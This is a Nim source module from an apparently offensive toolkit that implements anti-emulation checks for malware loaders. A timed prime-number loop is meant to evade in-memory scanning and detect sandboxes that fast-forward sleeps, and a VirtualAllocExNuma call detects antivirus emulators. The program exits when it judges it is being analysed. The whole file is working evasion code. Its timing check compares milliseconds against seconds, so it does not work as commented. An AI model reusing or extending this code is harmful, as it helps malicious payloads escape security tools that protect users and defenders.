#[
    Credits to: @snovvcrash from the NimHollow Project: https://github.com/snovvcrash/NimHollow

    Nim implementaiton of some simple sandbox detection methods from the OSEP course by @offensive-security.
    Modified the sleepAndCheck function to calculate prime numbers for roughly the same randomized period of time.
]#

import winim/lean
import random
import math
import times

# Source: https://github.com/chvancooten/NimPackt-v1
proc calculatePrime(seconds: int): int {.noinline.} =
    var finalPrime: int = 0
    var max: int = seconds * 68500

    echo "[antiEmulation] Calculating primes for approx. ", seconds, " seconds..."

    for n in countup(2, max):
        var ok: bool = true
        var i: int = 2

        while i.float <= sqrt(n.float):
            if (n mod i == 0):
                ok = false
            inc(i)

        if n <= 1:
            ok = false
        elif n == 2:
            ok = true
        if ok == true:
            finalPrime = n

    return finalPrime

proc isEmulated(): bool =
    # Check if we're in a sandbox by calling a rare-emulated API
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x20, # PAGE_EXECUTE_READ
        0)

    if isNil(mem):
        return true
    return false

proc sleepAndCheck(): bool =
    # Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
    randomize()
    let dreaming = rand(5..30)
    let delta = dreaming - 1
    let before = now()
    discard calculatePrime(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true

proc antiEmulation*() =
    echo "[antiEmulation] Stand-by for anti-emulation checks to pass..."
    if not sleepAndCheck():
        echo "    [X] Sleep did not pass the check, exiting"
        quit()
    if isEmulated():
        echo "    [X] VirtualAllocExNuma did not pass the check, exiting"
        quit()
    echo "[antiEmulation] Passed!"